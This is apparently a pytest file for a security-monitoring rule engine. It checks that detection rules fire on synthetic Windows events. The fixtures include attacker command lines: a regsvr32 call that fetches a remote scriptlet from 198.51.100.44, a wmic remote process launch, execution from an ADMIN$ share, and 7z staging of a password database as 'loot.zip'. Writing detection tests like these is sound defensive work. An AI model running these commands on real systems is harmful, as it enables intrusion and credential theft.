from pathlib import Path

from soc_forge.rules.engine import load_rules, run_rules


def _run_rule(rule_file, event):
    rules = load_rules([str(Path("soc_forge/rules") / rule_file)])
    return run_rules([event], rules)


def test_psexec_style_service_execution_detection():
    alerts = _run_rule(
        "SOCF-016.yml",
        {
            "timestamp": "2026-07-21T14:00:00Z",
            "event_id": 7045,
            "host": "WS-02",
            "username": "admin01",
            "ip": "198.51.100.44",
            "service_name": "PSEXESVC",
            "image_path": r"C:\Windows\PSEXESVC.exe",
            "message": "A service was installed: PSEXESVC",
        },
    )

    assert alerts[0]["rule_id"] == "SOCF-016"
    assert alerts[0]["details"]["service_name"] == "PSEXESVC"


def test_wmi_process_execution_detection():
    alerts = _run_rule(
        "SOCF-017.yml",
        {
            "timestamp": "2026-07-21T14:01:00Z",
            "event_id": 4688,
            "host": "WS-02",
            "username": "admin01",
            "ip": "198.51.100.44",
            "process_name": "wmic.exe",
            "command_line": "wmic /node:WS-02 process call create cmd.exe /c whoami",
            "message": "wmic process call create cmd.exe",
        },
    )

    assert alerts[0]["rule_id"] == "SOCF-017"


def test_suspicious_lolbin_script_execution_detection():
    alerts = _run_rule(
        "SOCF-018.yml",
        {
            "timestamp": "2026-07-21T14:02:00Z",
            "event_id": 4688,
            "host": "WS-02",
            "username": "alice",
            "process_name": "regsvr32.exe",
            "command_line": "regsvr32.exe /s /n /u /i:http://198.51.100.44/a.sct scrobj.dll",
            "message": "regsvr32 remote scriptlet execution",
        },
    )

    assert alerts[0]["rule_id"] == "SOCF-018"


def test_remote_admin_share_execution_detection():
    alerts = _run_rule(
        "SOCF-019.yml",
        {
            "timestamp": "2026-07-21T14:03:00Z",
            "event_id": 4688,
            "host": "WS-02",
            "username": "admin01",
            "process_name": "cmd.exe",
            "command_line": r"\\WS-03\ADMIN$\update.exe",
            "message": r"Process created from \\WS-03\ADMIN$\update.exe",
        },
    )

    assert alerts[0]["rule_id"] == "SOCF-019"


def test_suspicious_archive_staging_detection():
    alerts = _run_rule(
        "SOCF-020.yml",
        {
            "timestamp": "2026-07-21T14:04:00Z",
            "event_id": 4688,
            "host": "WS-02",
            "username": "alice",
            "process_name": "7z.exe",
            "command_line": r"7z.exe a C:\Forensics\loot.zip C:\Users\alice\Documents\passwords.kdbx",
            "message": "7z archived sensitive user documents",
        },
    )

    assert alerts[0]["rule_id"] == "SOCF-020"
